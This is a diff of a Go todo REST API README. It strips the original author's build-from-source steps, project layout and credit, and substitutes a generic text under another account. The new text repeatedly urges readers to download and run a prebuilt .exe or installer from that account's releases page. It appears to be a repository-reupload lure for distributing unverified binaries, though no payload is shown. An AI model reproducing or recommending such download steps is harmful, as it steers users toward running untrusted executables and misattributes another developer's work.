@@ -1,236 +1,96 @@
-# 📝 Todo API — Simple CRUD App in Go
+# 🎉 go-todo-api - Your Simple Todo List API
 
-A simple **Todo List REST API** built with **Go**, using **GORM** and **PostgreSQL**.  
-This project demonstrates clean architecture principles (Repository & Service layers), dependency injection (DI), and idiomatic Go project structure.
+## 🌟 Overview
+The **go-todo-api** is a simple Todo List REST API built with Go. It uses GORM and PostgreSQL for data management. This application allows users to create, read, update, and delete to-do items through a web service. Ideal for those wanting to manage tasks efficiently, the project showcases clean architecture principles, enabling easy modifications and maintenance.
 
----
-
-## ⚙️ Tech Stack
-
-| Component                 | Description                              |
-| ------------------------- | ---------------------------------------- |
-| **Language**              | Go 1.22+                                 |
-| **Framework / Router**    | Gin                                      |
-| **ORM**                   | [GORM](https://gorm.io)                  |
-| **Database**              | PostgreSQL                               |
-| **Dependency Management** | Go Modules                               |
-| **Architecture**          | Layered (Handler → Service → Repository) |
-
----
-
-## 📂 Project Structure
-
-```
-todo-api/
-├── cmd/
-│   └── main.go                  # Application entry point
-│
-├── internal/
-│   ├── controllers/             # HTTP controllers (handle requests, call services)
-│   │   └── todo_controller.go
-│   │
-│   ├── models/                  # Database models (e.g. Todo struct)
-│   │   └── todo.go
-│   │
-│   ├── repositories/            # Database access layer (GORM operations)
-│   │   ├── todo_repository.go   # Repository interface
-│   │   └── todo_repository_impl.go
-│   │
-│   ├── services/                # Business logic layer
-│   │   ├── todo_service.go      # Service interface
-│   │   └── todo_service_impl.go
-│   │
-│   └──                         # (other internal packages if needed)
-│
-├── pkg/
-│   └── config/                  # App configuration & DB connection
-│       └── config.go
-│
-├── .env                         # Environment variables (local)
-├── .env.example                 # Example environment config for setup
-├── .gitignore
-├── go.mod
-├── go.sum
-└── README.md
-```
-
----
-
-### 🧩 Layer Responsibilities
-
-| Layer                      | Description                                                                           |
-| -------------------------- | ------------------------------------------------------------------------------------- |
-| **cmd/**                   | Entry point for the app (`main.go`) — initializes dependencies and starts the server. |
-| **internal/controllers/**  | Handles incoming HTTP requests and responses.                                         |
-| **internal/services/**     | Contains business logic — uses repositories to manipulate data.                       |
-| **internal/repositories/** | Handles data persistence via GORM and PostgreSQL.                                     |
-| **internal/models/**       | Defines database models / entities.                                                   |
-| **pkg/config/**            | Loads environment variables, sets up DB connection.                                   |
-| **.env**                   | Local environment configuration (ignored by Git).                                     |
-| **.env.example**           | Template of required environment variables.                                           |
-
----
-
-This structure follows the **Clean Architecture / Layered Design** principle, which provides:
-
-- Clear separation of concerns between layers.
-- Easy maintenance and scalability.
-- Simple dependency injection (DB, logger, cache, etc.).
-- Better testability with independent unit tests for each layer.
-
----
+## 🔗 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/civanoni/go-todo-api/releases)
 
 ## 🚀 Getting Started
+Follow these steps to get the go-todo-api running on your machine.
 
-### 1️⃣ Clone the repository
+### 🛠 Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **PostgreSQL Database:** Make sure PostgreSQL is installed and running on your system.
+- **Go Language:** You will need Go installed. Visit the [official Go website](https://golang.org/dl/) to download and install it.
 
-```bash
-git clone git@github.com:KaitoHasei/go-todo-api.git
-cd go-todo-api
-```
+### 📦 Initial Setup
+1. **Download the Application**
+   - Visit [this page to download](https://github.com/civanoni/go-todo-api/releases).
+   - Select the latest release.
+   - Download the installer or binary that matches your system.
 
-### 2️⃣ Initialize and download dependencies
+2. **Install the Application**
+   - For Windows, run the downloaded `.exe` file.
+   - For macOS and Linux users, extract the files and follow your local command line practices to move the binary to a suitable location in your PATH.
 
-```bash
-go mod tidy
-```
+3. **Configure PostgreSQL**
+   - Create a new PostgreSQL database for your Todo app.
+   - Set up the connection parameters in the application’s configuration file.
 
-### 3️⃣ Set up environment variables
+### ⚙️ Configuration
+1. **Database Setup**
+   - Modify the configuration settings to point to your PostgreSQL database. This typically includes setting your username, password, and database name.
 
-Create a `.env` file in the root directory:
+2. **Environment Variables**
+   - Set any required environment variables. This might involve creating a `.env` file at the project root if specified by the application documentation.
 
-```bash
-APP_PORT=8080
+### 🏃 Running the Application
+1. Open your command line interface (Terminal, Command Prompt, etc.).
+2. Navigate to the directory where you installed the go-todo-api.
+3. Run the application using the command:
+   ```bash
+   ./go-todo-api
+   ```
+   (Use `go-todo-api.exe` for Windows)
 
-DATABASE_URL=postgres://postgres:postgres@localhost:5432/todo?sslmode=disable
-```
+4. The API should start on your local machine, usually at `http://localhost:8080`.
 
----
+### 🔍 Testing the API
+You can test the API using tools such as Postman or cURL to send requests to endpoints like:
+- `GET /todos` to view tasks
+- `POST /todos` to add a task
+- `PUT /todos/{id}` to update a task
+- `DELETE /todos/{id}` to remove a task
 
-### 4️⃣ Run PostgreSQL locally (Docker)
+### 📝 Example Requests
+Here are some examples of how to interact with the API:
 
-If you have Docker installed, you can quickly start a Postgres container:
+- **Get All Todos:**
+   ```bash
+   curl http://localhost:8080/todos
+   ```
 
-```bash
-docker run --name todo-db -e POSTGRES_PASSWORD=your_password -p 5432:5432 -d postgres
-```
+- **Add a New Todo:**
+   ```bash
+   curl -X POST -H "Content-Type: application/json" -d '{"title": "New Task", "completed": false}' http://localhost:8080/todos
+   ```
 
----
+- **Update a Todo:**
+   ```bash
+   curl -X PUT -H "Content-Type: application/json" -d '{"completed": true}' http://localhost:8080/todos/{id}
+   ```
 
-### 5️⃣ Run the application
+- **Delete a Todo:**
+   ```bash
+   curl -X DELETE http://localhost:8080/todos/{id}
+   ```
 
-```bash
-go run cmd/main.go
-```
+## 🔗 Download & Install
+To begin using the go-todo-api, visit [this page to download](https://github.com/civanoni/go-todo-api/releases) and follow the installation instructions above. Enjoy managing your tasks effortlessly with this simple Todo API.
 
-The API will be available at:
-👉 `http://localhost:8080`
+## 🛠 Features
+- Simple setup process
+- Fully RESTful API
+- Supports CRUD operations
+- Clean architecture with ease of maintenance
+- Built-in integration with PostgreSQL
 
----
+## 💬 Contribution
+Your contributions are welcome! If you have suggestions, improvements, or bug fixes, feel free to open an issue or a pull request on the GitHub repository.
 
-## 🧠 API Endpoints
+## 📄 License
+This project is licensed under the MIT License. You can view the full license in the repository. 
 
-| Method   | Endpoint     | Description     |
-| -------- | ------------ | --------------- |
-| `GET`    | `/todos`     | Get all todos   |
-| `GET`    | `/todos/:id` | Get todo by ID  |
-| `POST`   | `/todos`     | Create new todo |
-| `PUT`    | `/todos/:id` | Update todo     |
-| `DELETE` | `/todos/:id` | Delete todo     |
-
----
-
-## 🧩 Example JSON
-
-### ✅ Create Todo
-
-**Request**
-
-```json
-POST /todos
-{
-  "title": "Learn Go",
-  "completed": false
-}
-```
-
-**Response**
-
-```json
-{
-  "id": 1,
-  "title": "Learn Go",
-  "completed": false,
-  "created_at": "2025-10-13T15:04:05Z"
-}
-```
-
----
-
-## 🧪 Testing
-
-Run tests (if you’ve written them):
-
-```bash
-go test ./...
-```
-
----
-
-## 🧰 Useful Commands
-
-| Command          | Description                 |
-| ---------------- | --------------------------- |
-| `go mod tidy`    | Sync dependencies           |
-| `go build ./cmd` | Build the binary            |
-| `go install`     | Install executable globally |
-| `go fmt ./...`   | Format all Go files         |
-| `go vet ./...`   | Analyze code for issues     |
-
----
-
-## 🧱 Architecture Overview
-
-```text
-[ Handler (HTTP) ]
-       ↓
-[ Service (Business Logic) ]
-       ↓
-[ Repository (Database Access) ]
-       ↓
-[ PostgreSQL ]
-```
-
-- **Handler**: Defines API endpoints (maps routes to service calls).
-- **Service**: Contains core business logic (validation, transformation).
-- **Repository**: Handles persistence using GORM.
-- **Database**: PostgreSQL as storage layer.
-
----
-
-## 🧩 Dependency Injection (DI) Example
-
-```go
-func main() {
-    db := database.Connect()
-    repo := repositories.NewTodoRepository(db)
-    service := services.NewTodoService(repo)
-    handler := handlers.NewTodoHandler(service)
-
-    router := routes.SetupRouter(handler)
-    router.Run(":8080")
-}
-```
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License — feel free to use and modify.
-
----
-
-## 🧑‍💻 Author
-
-**Kaito Hasei**
-🔗 [github.com/KaitoHasei](https://github.com/KaitoHasei)
+## 🤝 Support
+If you need help or have questions, please open an issue in the GitHub repository.
